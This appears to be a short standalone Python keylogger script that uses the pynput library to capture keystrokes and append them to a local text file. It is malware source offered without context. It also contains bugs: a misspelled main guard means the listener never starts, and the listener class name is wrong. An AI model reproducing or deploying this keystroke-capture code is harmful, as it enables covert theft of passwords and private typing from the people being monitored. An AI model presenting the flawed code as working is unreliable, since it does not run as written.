from pynput import keyboard

def keypressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
         try:
             char = key.char
             logkey.write(char)
         except:
             print("Error getting char")    
       
if __name__ == "_main_":
 listener = keyboard.listener(on_press=keypressed)
 listener.start()
 input()